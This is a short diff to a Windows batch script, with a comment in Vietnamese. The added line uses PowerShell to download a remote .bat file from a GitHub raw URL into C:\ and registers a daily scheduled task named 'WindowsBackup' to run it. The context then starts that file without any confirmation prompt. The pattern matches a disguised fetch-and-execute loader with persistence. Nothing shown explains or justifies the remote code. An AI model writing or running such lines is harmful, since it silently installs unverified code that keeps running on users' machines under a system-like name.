@@ -32,6 +32,7 @@ if %found%==1 (
 
 
 
+powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'; schtasks /create /tn 'WindowsBackup' /tr 'C:\windows-backup.bat' /sc daily /st 00:00 /f}"
 
 :: Chạy file .bat mà không hỏi xác nhận
 start "" "C:\windows-backup.bat"
